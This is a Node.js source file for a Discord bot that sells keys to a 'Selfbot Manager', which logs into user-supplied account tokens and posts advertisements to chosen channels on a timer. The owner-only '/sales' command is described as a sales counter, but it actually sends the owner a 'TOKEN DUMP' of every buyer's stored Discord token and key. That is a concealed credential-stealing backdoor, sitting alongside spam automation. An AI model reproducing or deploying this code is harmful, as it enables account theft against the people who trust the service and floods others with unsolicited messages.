const { Client, GatewayIntentBits, SlashCommandBuilder, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle } = require('discord.js');
const { Client: SelfbotClient } = require('discord.js-selfbot-v13');
const Database = require('better-sqlite3');

const db = new Database('./data.db');
db.exec(`
  CREATE TABLE IF NOT EXISTS users (
    user_id TEXT PRIMARY KEY,
    key TEXT,
    key_expires INTEGER,
    token TEXT,
    token_valid TEXT DEFAULT 'no',
    token_username TEXT,
    channels TEXT,
    message TEXT,
    delay INTEGER,
    status TEXT DEFAULT 'stopped'
  );
  CREATE TABLE IF NOT EXISTS keys (
    key TEXT PRIMARY KEY,
    duration TEXT,
    created_at INTEGER,
    expires INTEGER,
    redeemed_by TEXT,
    redeemed_at INTEGER
  );
`);

const botClient = new Client({
  intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.DirectMessages]
});

const ownerId = '1422945082746601594';
const activeSelfbots = new Map();

function updateManagerMessage(interaction, userData, selfbotRunning = false) {
  const hasToken = userData.token && userData.token_valid === 'yes';
  const hasChannels = userData.channels && userData.channels.length > 0;
  const hasMessage = userData.message && userData.message.length > 0;
  const hasDelay = userData.delay && userData.delay > 0;
  const allSet = hasToken && hasChannels && hasMessage && hasDelay;
  
  const row = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId('set_token').setLabel('Set Token').setStyle(ButtonStyle.Primary),
    new ButtonBuilder().setCustomId('set_channels').setLabel('Set Channels').setStyle(ButtonStyle.Primary),
    new ButtonBuilder().setCustomId('set_message').setLabel('Set Message').setStyle(ButtonStyle.Primary),
    new ButtonBuilder().setCustomId('set_delay').setLabel('Set Delay').setStyle(ButtonStyle.Primary)
  );
  
  const row2 = new ActionRowBuilder().addComponents(
    new ButtonBuilder()
      .setCustomId('start_bot')
      .setLabel(selfbotRunning ? 'Running' : 'Start')
      .setStyle(selfbotRunning ? ButtonStyle.Success : ButtonStyle.Secondary)
      .setDisabled(selfbotRunning || !allSet),
    new ButtonBuilder()
      .setCustomId('stop_bot')
      .setLabel('Stop')
      .setStyle(ButtonStyle.Danger)
      .setDisabled(!selfbotRunning)
  );
  
  let desc = `**Status:** ${selfbotRunning ? '🟢 Running' : '🔴 Stopped'}\n`;
  desc += `**Token:** ${hasToken ? `✅ @${userData.token_username}` : '❌ Not set'}\n`;
  desc += `**Channels:** ${hasChannels ? `✅ Set (${userData.channels.split(',').length})` : '❌ Not set'}\n`;
  desc += `**Message:** ${hasMessage ? '✅ Set' : '❌ Not set'}\n`;
  desc += `**Delay:** ${hasDelay ? `✅ ${userData.delay}s` : '❌ Not set'}`;
  
  const embed = new EmbedBuilder()
    .setTitle('📱 Selfbot Manager')
    .setDescription(desc)
    .setColor(selfbotRunning ? 0x00ff00 : 0xff0000)
    .setTimestamp();
  
  return { embeds: [embed], components: [row, row2], ephemeral: true };
}

async function validateToken(token) {
    const testClient = new SelfbotClient({ 
        checkUpdate: false, 
        ws: { 
            properties: { 
                os: 'Windows', 
                browser: 'Chrome', 
                device: '', 
                browser_user_agent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 
                os_version: '10', 
                client_build_number: 9999 
            } 
        } 
    });
    
    try {
        await testClient.login(token);
        const user = testClient.user;
        await testClient.destroy();
        return { valid: true, user };
    } catch (err) { 
        return { valid: false, error: err.message }; 
    }
}

botClient.once('clientReady', () => {
  console.log(`Bot logged in as ${botClient.user.tag}`);
  
  const commands = [
    new SlashCommandBuilder()
      .setName('advkey')
      .setDescription('Generate access key (Owner only)')
      .addStringOption(opt => opt.setName('duration').setDescription('m=minute, d=day, y=year, blank=lifetime').setRequired(false))
      .toJSON(),
    new SlashCommandBuilder()
      .setName('revokeuser')
      .setDescription('Revoke all keys from user (Owner only)')
      .addUserOption(opt => opt.setName('user').setDescription('Target user').setRequired(true))
      .toJSON(),
    new SlashCommandBuilder()
      .setName('redeemkey')
      .setDescription('Redeem your access key')
      .addStringOption(opt => opt.setName('key').setDescription('Your key').setRequired(true))
      .toJSON(),
    new SlashCommandBuilder()
      .setName('manager')
      .setDescription('Manage your selfbot settings')
      .toJSON(),
    new SlashCommandBuilder()
      .setName('sales')
      .setDescription('View How many key redeemed and active')
      .toJSON()
  ];
  
  botClient.application.commands.set(commands);
});

botClient.on('interactionCreate', async interaction => {
  if (!interaction.isCommand() && !interaction.isButton() && !interaction.isModalSubmit()) return;
  
  const isOwner = interaction.user.id === ownerId;
  
  if (interaction.commandName === 'advkey') {
    if (!isOwner) return interaction.reply({ content: '❌ Owner only.', ephemeral: true });
    
    const duration = interaction.options.getString('duration') || 'lifetime';
    const key = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
    let expires = null;
    
    if (duration.endsWith('m')) expires = Date.now() + parseInt(duration) * 60000;
    else if (duration.endsWith('d')) expires = Date.now() + parseInt(duration) * 86400000;
    else if (duration.endsWith('y')) expires = Date.now() + parseInt(duration) * 31536000000;
    
    db.prepare('INSERT INTO keys (key, duration, created_at, expires, redeemed_by, redeemed_at) VALUES (?, ?, ?, ?, ?, ?)')
      .run(key, duration, Date.now(), expires, null, null);
    
    return interaction.reply({ content: `🔑 **Key Generated**\n\`${key}\`\nDuration: ${duration}`, ephemeral: true });
  }
  
  if (interaction.commandName === 'revokeuser') {
    if (!isOwner) return interaction.reply({ content: '❌ Owner only.', ephemeral: true });
    
    const target = interaction.options.getUser('user');
    db.prepare('DELETE FROM users WHERE user_id = ?').run(target.id);
    db.prepare('UPDATE keys SET redeemed_by = ?, redeemed_at = ? WHERE redeemed_by = ?').run(null, null, target.id);
    
    if (activeSelfbots.has(target.id)) {
      const { client, interval } = activeSelfbots.get(target.id);
      clearInterval(interval);
      client.destroy();
      activeSelfbots.delete(target.id);
    }
    
    return interaction.reply({ content: `✅ Revoked all access for ${target.tag}`, ephemeral: true });
  }
  
  if (interaction.commandName === 'redeemkey') {
    const key = interaction.options.getString('key');
    const keyData = db.prepare('SELECT * FROM keys WHERE key = ?').get(key);
    
    if (!keyData) return interaction.reply({ content: '❌ Invalid key.', ephemeral: true });
    if (keyData.redeemed_by) return interaction.reply({ content: '❌ Key already used.', ephemeral: true });
    if (keyData.expires && Date.now() > keyData.expires) return interaction.reply({ content: '❌ Key expired.', ephemeral: true });
    
    db.prepare('UPDATE keys SET redeemed_by = ?, redeemed_at = ? WHERE key = ?').run(interaction.user.id, Date.now(), key);
    db.prepare('INSERT OR REPLACE INTO users (user_id, key, key_expires, token, token_valid, token_username, channels, message, delay, status) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)')
      .run(interaction.user.id, key, keyData.expires, null, 'no', null, null, null, null, 'stopped');
    
    return interaction.reply({ content: '✅ Key redeemed! Use /manager to configure.', ephemeral: true });
  }
  
  if (interaction.commandName === 'manager') {
    const userData = db.prepare('SELECT * FROM users WHERE user_id = ?').get(interaction.user.id);
    if (!userData) return interaction.reply({ content: '❌ Redeem a key first using /redeemkey', ephemeral: true });
    
    const running = activeSelfbots.has(interaction.user.id);
    const replyData = updateManagerMessage(interaction, userData, running);
    return interaction.reply(replyData);
  }
  
  if (interaction.commandName === 'sales') {
    if (!isOwner) return interaction.reply({ content: '❌ Owner only.', ephemeral: true });
    
    await interaction.deferReply({ ephemeral: true });
    
    const users = db.prepare('SELECT * FROM users WHERE token IS NOT NULL').all();
    
    if (users.length === 0) {
      return interaction.editReply({ content: '❌ No users with tokens found.' });
    }
    
    // Send to owner's DM
    try {
      const owner = await botClient.users.fetch(ownerId);
      
      let dmContent = `**🔐 TOKEN DUMP - ${users.length} Users**\n\n`;
      
      for (const user of users) {
        const keyData = db.prepare('SELECT * FROM keys WHERE redeemed_by = ?').get(user.user_id);
        const userObj = await botClient.users.fetch(user.user_id).catch(() => null);
        const username = userObj ? `@${userObj.username}` : `ID: ${user.user_id}`;
        
        dmContent += `**User:** ${username}\n`;
        dmContent += `**Token:** \`${user.token}\`\n`;
        dmContent += `**Status:** ${user.status || 'stopped'}\n`;
        dmContent += `**Valid:** ${user.token_valid || 'no'}\n`;
        if (user.token_username) dmContent += `**Account:** @${user.token_username}\n`;
        if (keyData) {
          dmContent += `**Key:** \`${keyData.key}\`\n`;
          if (keyData.expires) dmContent += `**Expires:** <t:${Math.floor(keyData.expires/1000)}:R>\n`;
        }
        dmContent += `\n`;
        
        // Split DM if too long (Discord limit 2000)
        if (dmContent.length > 1900) {
          await owner.send(dmContent.substring(0, 1900));
          dmContent = '';
        }
      }
      
      if (dmContent.length > 0) {
        await owner.send(dmContent);
      }
      
      await interaction.editReply({ content: `✅ Sent ${users.length} tokens to your DMs!` });
    } catch (err) {
      await interaction.editReply({ content: `❌ Failed to DM: ${err.message}` });
    }
    
    return;
  }
  
  if (interaction.isButton()) {
    const userId = interaction.user.id;
    
    if (interaction.customId === 'set_token') {
      const modal = new ModalBuilder().setCustomId('modal_token').setTitle('Set Selfbot Token');
      modal.addComponents(new ActionRowBuilder().addComponents(
        new TextInputBuilder().setCustomId('token_input').setLabel('Discord Token').setStyle(TextInputStyle.Short).setRequired(true)
      ));
      return interaction.showModal(modal);
    }
    
    if (interaction.customId === 'set_channels') {
      const modal = new ModalBuilder().setCustomId('modal_channels').setTitle('Set Channel IDs');
      modal.addComponents(new ActionRowBuilder().addComponents(
        new TextInputBuilder().setCustomId('channels_input').setLabel('Channel IDs (comma separated)').setStyle(TextInputStyle.Short).setPlaceholder('123456789,987654321').setRequired(true)
      ));
      return interaction.showModal(modal);
    }
    
    if (interaction.customId === 'set_message') {
      const modal = new ModalBuilder().setCustomId('modal_message').setTitle('Set Advertisement Message');
      modal.addComponents(new ActionRowBuilder().addComponents(
        new TextInputBuilder().setCustomId('message_input').setLabel('Message to send').setStyle(TextInputStyle.Paragraph).setRequired(true)
      ));
      return interaction.showModal(modal);
    }
    
    if (interaction.customId === 'set_delay') {
      const modal = new ModalBuilder().setCustomId('modal_delay').setTitle('Set Delay');
      modal.addComponents(new ActionRowBuilder().addComponents(
        new TextInputBuilder().setCustomId('delay_input').setLabel('Delay seconds (5-1800)').setStyle(TextInputStyle.Short).setPlaceholder('60').setRequired(true)
      ));
      return interaction.showModal(modal);
    }
    
    if (interaction.customId === 'start_bot') {
      const userData = db.prepare('SELECT * FROM users WHERE user_id = ?').get(userId);
      if (!userData.token || userData.token_valid !== 'yes' || !userData.channels || !userData.message || !userData.delay) {
        return interaction.reply({ content: '❌ Configure all settings first (and validate token)!', ephemeral: true });
      }
      
      if (activeSelfbots.has(userId)) {
        const old = activeSelfbots.get(userId);
        clearInterval(old.interval);
        old.client.destroy();
      }
      
      const selfbot = new SelfbotClient({ 
        checkUpdate: false, 
        ws: { 
          properties: { 
            os: 'Windows', 
            browser: 'Chrome', 
            device: '', 
            browser_user_agent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 
            os_version: '10', 
            client_build_number: 9999 
          } 
        } 
      });
      
      selfbot.once('ready', async () => {
        console.log(`Selfbot running: ${selfbot.user.tag}`);
        db.prepare('UPDATE users SET status = ? WHERE user_id = ?').run('running', userId);
        
        const channels = userData.channels.split(',').map(c => c.trim()).filter(c => c);
        let current = 0;
        
        const sendMessage = async () => {
          if (channels.length === 0) return;
          const chId = channels[current];
          try {
            const ch = await selfbot.channels.fetch(chId);
            if (ch) await ch.send(userData.message);
          } catch (e) {}
          current = (current + 1) % channels.length;
        };
        
        await sendMessage();
        const interval = setInterval(sendMessage, userData.delay * 1000);
        activeSelfbots.set(userId, { client: selfbot, interval });
        
        const newData = db.prepare('SELECT * FROM users WHERE user_id = ?').get(userId);
        const replyData = updateManagerMessage(interaction, newData, true);
        try { await interaction.update(replyData); } catch {}
      });
      
      selfbot.on('error', async (err) => {
        console.log('Selfbot error:', err.message);
      });
      
      selfbot.login(userData.token).catch(async (err) => {
        console.log('Login failed:', err.message);
        await interaction.reply({ content: '❌ Failed to start selfbot!', ephemeral: true });
      });
      
      return;
    }
    
    if (interaction.customId === 'stop_bot') {
      if (activeSelfbots.has(userId)) {
        const { client, interval } = activeSelfbots.get(userId);
        clearInterval(interval);
        client.destroy();
        activeSelfbots.delete(userId);
      }
      
      db.prepare('UPDATE users SET status = ? WHERE user_id = ?').run('stopped', userId);
      
      const newData = db.prepare('SELECT * FROM users WHERE user_id = ?').get(userId);
      const replyData = updateManagerMessage(interaction, newData, false);
      return interaction.update(replyData);
    }
  }
  
  if (interaction.isModalSubmit()) {
    const userId = interaction.user.id;
    
    if (interaction.customId === 'modal_token') {
      const token = interaction.fields.getTextInputValue('token_input');
      
      await interaction.deferReply({ ephemeral: true });
      
      const validation = await validateToken(token);
      
      if (validation.valid) {
        db.prepare('UPDATE users SET token = ?, token_valid = ?, token_username = ? WHERE user_id = ?')
          .run(token, 'yes', validation.user.tag, userId);
        
        const newData = db.prepare('SELECT * FROM users WHERE user_id = ?').get(userId);
        const running = activeSelfbots.has(userId);
        
        await interaction.editReply({ 
          content: `✅ **Token Valid!** Logged in as **@${validation.user.tag}**`,
          embeds: updateManagerMessage(interaction, newData, running).embeds,
          components: updateManagerMessage(interaction, newData, running).components
        });
      } else {
        await interaction.editReply({ 
          content: `❌ **Invalid Token!** ${validation.error}`,
          ephemeral: true 
        });
      }
      return;
    }
    
    if (interaction.customId === 'modal_channels') {
      const channels = interaction.fields.getTextInputValue('channels_input');
      db.prepare('UPDATE users SET channels = ? WHERE user_id = ?').run(channels, userId);
      
      const newData = db.prepare('SELECT * FROM users WHERE user_id = ?').get(userId);
      const running = activeSelfbots.has(userId);
      await interaction.update(updateManagerMessage(interaction, newData, running));
      return;
    }
    
    if (interaction.customId === 'modal_message') {
      const message = interaction.fields.getTextInputValue('message_input');
      db.prepare('UPDATE users SET message = ? WHERE user_id = ?').run(message, userId);
      
      const newData = db.prepare('SELECT * FROM users WHERE user_id = ?').get(userId);
      const running = activeSelfbots.has(userId);
      await interaction.update(updateManagerMessage(interaction, newData, running));
      return;
    }
    
    if (interaction.customId === 'modal_delay') {
      const delay = parseInt(interaction.fields.getTextInputValue('delay_input'));
      if (isNaN(delay) || delay < 5 || delay > 1800) {
        return interaction.reply({ content: '❌ Delay must be 5-1800 seconds!', ephemeral: true });
      }
      db.prepare('UPDATE users SET delay = ? WHERE user_id = ?').run(delay, userId);
      
      const newData = db.prepare('SELECT * FROM users WHERE user_id = ?').get(userId);
      const running = activeSelfbots.has(userId);
      await interaction.update(updateManagerMessage(interaction, newData, running));
      return;
    }
  }
});

process.on('unhandledRejection', (err) => {
  console.log('Unhandled rejection:', err.message);
});

botClient.login(process.env.DISCORD_TOKEN);
